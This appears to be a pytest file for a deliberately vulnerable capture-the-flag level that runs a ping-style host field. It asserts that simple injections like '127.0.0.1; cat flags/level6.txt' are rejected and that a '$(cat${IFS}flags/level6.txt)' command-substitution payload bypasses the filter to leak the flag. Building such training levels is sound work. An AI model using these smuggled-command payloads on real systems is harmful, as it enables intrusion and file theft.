from levels.utils import read_flag


def test_level6_benign_request(client):
    resp = client.post("/level6", data={"host": "127.0.0.1"})
    assert "bytes of data" in resp.get_data(as_text=True)


def test_level6_spaces_and_separators_rejected(client):
    payloads = [
        "127.0.0.1; cat flags/level6.txt",
        "127.0.0.1 cat flags/level6.txt",
        "cat flags/level6.txt",
    ]
    for payload in payloads:
        resp = client.post("/level6", data={"host": payload})
        body = resp.get_data(as_text=True)
        assert "Rejected" in body
        assert read_flag("level6") not in body


def test_level6_ifs_command_substitution_reveals_flag(client):
    resp = client.post("/level6", data={"host": "$(cat${IFS}flags/level6.txt)"})
    body = resp.get_data(as_text=True)
    assert read_flag("level6") in body
